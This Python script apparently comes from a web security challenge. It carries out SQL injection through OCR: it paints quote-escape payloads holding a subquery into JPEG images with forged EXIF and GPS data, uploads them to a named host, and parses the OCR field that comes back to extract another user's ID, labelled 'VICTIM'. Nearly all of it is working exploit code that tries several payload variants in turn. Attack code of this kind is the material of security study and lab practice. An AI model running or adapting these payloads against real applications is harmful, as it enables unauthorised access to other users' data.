# fine_tune.py — a''..''  (doubled quotes glued to letters) reads as a'..' (single quotes).
# That row stored LITERAL though. Fine-tune: maybe summary_ocr is inserted WITHOUT surrounding
# quotes in some code path, or we need the subquery to REPLACE the whole value. Try forms that
# make the ENTIRE value be the subquery result, and forms with trailing comment.
from PIL import Image, ImageDraw, ImageFont
import piexif, base64, requests, re

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")
q = chr(39)
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

def build(text, path, size=32):
    W = min(1600, max(1000, 40+int(len(text)*size*0.60))); H=280
    img = base_img.resize((W,H)); d=ImageDraw.Draw(img)
    font=None
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: font=ImageFont.truetype(p,size); break
        except: pass
    if font is None: font=ImageFont.load_default()
    bbox=d.textbbox((20,20),text,font=font)
    d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=font,fill=(0,0,0))
    img.save(path,"jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),path)
    return "data:image/jpeg;base64,"+base64.b64encode(open(path,"rb").read()).decode()

def run(name, painted):
    uri = build(painted, "ft.jpg")
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":name,"user_id":UID})
    sc = r.status_code; ocr=""
    if sc==200:
        data = requests.get(f"{BASE}/images/{UID}").json()
        row = next((x for x in data if x.get("description")==name), None)
        ocr = row.get("summary_ocr","") if row else ""
    leak=[u for u in UURE.findall(str(ocr)) if u!=UID]
    print(f"{name:16} {sc} ocr={ocr!r}" + (f"  >>> VICTIM {leak}" if leak else ""))
    return leak[0] if leak else None

SUB="(SELECT user_id FROM images WHERE id=1)"
# Base working quote-reading form is: a'' ... '' -> a' ... '
# Variants to force execution:
tries = {
  # doubled quotes both ends, glued to letters both ends (mirror), aiming a' ... 'b
  "a_dd_b":   "a"+q+q+"||"+SUB+"||"+q+q+"b",
  # make value BE the subquery: a'' = a, then ||sub||, then '' b  -> 'a'||sub||'b'
  "eq_form":  "a"+q+q+"="+q+q+"||"+SUB+"||"+q+q,
  # trailing comment style: a'' ||sub  then comment out the rest (-- read poorly, try /**/ none)
  "comment":  "a"+q+q+"||"+SUB+" ",
  # 3 doubled? a''' ...
  "a_ddd":    "a"+q+q+q+"||"+SUB+"||"+q+q+q,
  # doubled-open, single-effective close with letter:  a'' ||sub||' b
  "mix1":     "a"+q+q+"||"+SUB+"||"+q+"b",
}
found=None
for n,p in tries.items():
    hit=run("FT_"+n, p)
    if hit: found=hit; break
if found:
    print("\n==== VICTIM user_id:", found, "====")
